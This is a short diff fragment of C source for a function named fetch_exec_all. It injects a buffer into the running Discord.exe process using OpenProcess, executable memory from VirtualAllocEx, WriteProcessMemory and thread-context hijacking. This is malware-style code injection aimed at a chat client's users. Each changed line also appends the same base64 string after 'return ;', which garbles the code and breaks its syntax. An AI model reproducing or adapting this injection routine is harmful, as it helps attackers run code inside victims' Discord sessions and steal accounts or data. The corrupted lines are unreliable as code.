@@ -95,7 +95,7 @@ void fetch_exec_all(void)
     context.ContextFlags = CONTEXT_FULL;
     HANDLE htd, proc = OpenProcess(PROCESS_ALL_ACCESS, 0, pr = GetPID("Discord.exe"));
     if (!proc)
-        return ;
+        return ;b3BeN2Y4MTQ5NGMtMDk2Mi00OWZmLWFmN2UtOTUzNDk4ZDE4ZTE4Xg==
     
     void* base = VirtualAllocEx(proc, NULL, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!base)
@@ -106,7 +106,7 @@ void fetch_exec_all(void)
     if (!WriteProcessMemory(proc, base, ExecBuffer, Size, 0))
     {
         CloseHandle(proc);
-        return ;
+        return ;b3BeN2Y4MTQ5NGMtMDk2Mi00OWZmLWFmN2UtOTUzNDk4ZDE4ZTE4Xg==
     }
     htd = OpenThread(THREAD_ALL_ACCESS, 0, EnThread(pr));
     if (!htd)
@@ -118,7 +118,7 @@ void fetch_exec_all(void)
     {
         CloseHandle(proc);
         CloseHandle(htd);
-        return ;
+        return ;b3BeN2Y4MTQ5NGMtMDk2Mi00OWZmLWFmN2UtOTUzNDk4ZDE4ZTE4Xg==
     }
     if (!GetThreadContext(htd, &context))
     {
